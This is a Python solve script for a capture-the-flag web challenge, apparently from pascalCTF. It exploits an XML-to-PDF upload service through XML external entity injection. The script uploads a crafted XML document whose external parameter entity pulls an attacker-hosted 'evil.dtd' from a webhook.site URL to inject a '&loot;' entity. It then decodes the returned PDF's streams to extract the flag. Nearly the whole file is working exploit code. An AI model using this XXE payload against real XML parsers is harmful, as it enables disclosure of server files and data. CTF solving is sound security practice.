#!/usr/bin/env python3
import os
import requests
import re
import zlib
import base64
import logging
logging.disable()

URL = os.environ.get("URL", "https://pdfile.ctf.pascalctf.it")
if URL.endswith("/"): 
    URL = URL[:-1]

WEBHOOK_DTD = os.environ.get("WEBHOOK_URL", "http://webhook.site/787c0d65-d3f6-428f-b8ab-f7f786a64e27/evil.dtd")

def decode_pdf_content(pdf_content):
    """Minimal robust PDF stream decoder to find the flag."""
    start_marker = b'stream'
    end_marker = b'endstream'
    pos = 0
    while True:
        start = pdf_content.find(start_marker, pos)
        if start == -1: 
            break
        
        ds = start + len(start_marker)
        if ds + 1 < len(pdf_content) and pdf_content[ds:ds+2] == b'\r\n': 
            ds += 2
        elif ds < len(pdf_content) and pdf_content[ds:ds+1] == b'\n': 
            ds += 1
        
        end = pdf_content.find(end_marker, ds)
        if end == -1: 
            break
        
        s_data = pdf_content[ds:end].strip()
        if not s_data.startswith(b'<~'): 
            s_data = b'<~' + s_data
        if not s_data.endswith(b'~>'): 
            s_data = s_data + b'~>'
        
        try:
            decoded = base64.a85decode(s_data, adobe=True)
            decompressed = zlib.decompress(decoded)
            text = decompressed.decode('utf-8', errors='ignore')
            
            match = re.search(r'pascalCTF\{[^}]+\}', text)
            if match:
                return match.group(0)
            
            if "pascalCTF" in text:
                match = re.search(r'pascalCTF\{[^}]+\}', text)
                if match: 
                    return match.group(0)

        except:
            pass
        pos = end + len(end_marker)
    return None

def main():
    s = requests.Session()

    exploit_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
    <!ENTITY % remote SYSTEM "{WEBHOOK_DTD}">
    %remote;
]>
<book>
    <title>Exploit</title>
    <chapters>
        <chapter number="1">
            <title>Loot</title>
            <content>&loot;</content>
        </chapter>
    </chapters>
</book>"""
    
    try:
        files = {'file': ('evil.pasx', exploit_xml, 'application/xml')}
        r = s.post(URL + "/upload", files=files)
        
        if r.status_code == 200:
            json_resp = r.json()
            if json_resp.get('success'):
                pdf_url = json_resp.get('pdf_url')
                r_pdf = s.get(URL + pdf_url)
                if r_pdf.status_code == 200:
                    flag = decode_pdf_content(r_pdf.content)
                    if flag:
                        return flag
    except Exception as e:
        pass
    
    return "FLAG_NOT_FOUND"

if __name__ == "__main__":
   print(main())